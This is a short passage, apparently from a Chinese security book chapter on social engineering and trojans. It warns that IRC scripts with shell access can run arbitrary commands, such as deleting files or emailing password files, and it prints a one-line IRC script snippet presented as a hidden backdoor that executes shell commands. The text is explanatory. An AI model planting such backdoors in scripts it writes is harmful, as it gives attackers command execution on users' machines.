## 第 4 章：社会工程、木马和其他黑客骗术

`Unix shell` 访问可以编写一种脚本，让黑客能够运行任意 shell 命令，例如删除你所有文件的命令，或通过电子邮件向黑客发送密码文件。

一些公开的脚本包含意料之外的后门。以下 IRC 脚本片段的目的是允许另一个 IRC 用户获取某个文件：

```
/ctcp % % DCC SEND % * exec -name stuff ls $5
```
